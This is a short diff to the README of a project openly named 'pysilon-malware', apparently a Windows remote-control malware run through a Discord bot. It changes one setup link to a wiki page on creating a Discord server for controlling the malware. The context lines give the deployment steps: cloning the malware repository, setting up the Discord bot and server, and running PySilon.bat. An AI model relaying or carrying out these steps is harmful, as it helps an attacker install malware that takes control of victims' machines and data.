@@ -6,7 +6,7 @@ This malware is designed for Windows and because of some pip packages are availa
     git clone https://github.com/mategol/pysilon-malware
 ```
 
-- [Create Discord BOT and server](https://github.com/mategol/pysilon-malware#setup)  
+- [Create Discord BOT and server](https://github.com/mategol/PySilon-malware/wiki/Setup#creating-a-discord-server-for-controlling-the-malware)  
 - Run the PySilon.bat either using CMD or double clicking on it
 
 ---------------------
